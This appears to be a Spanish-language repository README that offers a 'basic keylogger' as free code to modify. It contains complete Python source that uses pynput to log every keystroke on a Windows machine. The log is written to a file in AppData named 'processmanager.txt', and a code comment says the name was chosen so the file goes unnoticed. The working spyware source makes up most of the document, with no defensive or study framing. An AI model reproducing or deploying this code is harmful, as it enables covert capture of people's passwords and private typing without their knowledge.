# Keylogger
**- Aqui vas a poder descargar un Keylogger Básico, siéntete libre de modificar lo que quieras a tu gusto es código libre!**

**- Este programa te permite registrar todas las entradas del teclado de un ordenador, eres libre de modificarlo a tu gusto.**


# Code

```python
# Importamos los modulos que usaremos

import os
import pynput
from pynput.keyboard import Listener 


keys = []
count = 0


path = os.environ ['appdata'] + '\\processmanager.txt' # Elegimos ruta donde guardar el txt + ponemos un nombre que pase desapercibido (Windows)


def on_press(key):
    global keys, count

    keys.append(key)
    count +=1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            
            if k.find('backspace') > 0:
                f.write(' Backspace ')

            elif k.find('enter') > 0:
                f.write('\n')
                
            elif k.find('shift') > 0:
                f.write(' Shift ')
            
            elif k.find ('space') > 0:
                f.write(' ')

            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')

            elif k.find('Key'):
                f.write(k)


with Listener(on_press=on_press) as Listener:
    Listener.join()


```
